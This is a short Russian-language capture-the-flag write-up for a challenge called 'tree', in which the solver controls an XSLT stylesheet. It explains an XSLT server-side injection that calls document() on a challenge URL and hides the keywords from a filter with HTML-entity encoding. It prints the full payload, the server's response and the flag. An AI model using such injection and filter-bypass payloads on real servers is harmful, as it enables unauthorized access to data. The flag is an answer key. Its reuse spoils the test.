## Название: tree
**Описание**: XML и XSLT очень богаты возможностями   
**Флаг**: `rtctf{n0T_pr0perlY_san1T1Z3d}`  
**Решение**:  
Видим, что есть XML (который редактировать не можем) и XSLT, который полностью под нашим контролем. Читаем https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations  
Понимаем, что нужно вызвать `document('http://give.me.a.flag/')` для активации FlagResolver, который и выдаст флаг.  
Используем HTML-encode (https://mothereff.in/html-entities) для обхода встроенного фильтра.  
`Transform` = `&#x54;&#x72;&#x61;&#x6e;&#x73;&#x66;&#x6f;&#x72;&#x6d;`  
`document('http://give.me.a.flag/')` = `&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;('&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x67;&#x69;&#x76;&#x65;&#x2e;&#x6d;&#x65;&#x2e;&#x61;&#x2e;&#x66;&#x6c;&#x61;&#x67;&#x2f;')`  
Итоговый payload:  
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/&#x54;&#x72;&#x61;&#x6e;&#x73;&#x66;&#x6f;&#x72;&#x6d;">
  <xsl:template match="/">
    <output>
      <xsl:value-of select="&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;('&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x67;&#x69;&#x76;&#x65;&#x2e;&#x6d;&#x65;&#x2e;&#x61;&#x2e;&#x66;&#x6c;&#x61;&#x67;&#x2f;')"/>
      
    </output>
  </xsl:template>
</xsl:stylesheet>
```
Сервер ответит флагом:
```xml
<?xml version="1.0"?>
<output>rtctf{n0T_pr0perlY_san1T1Z3d}</output>
```
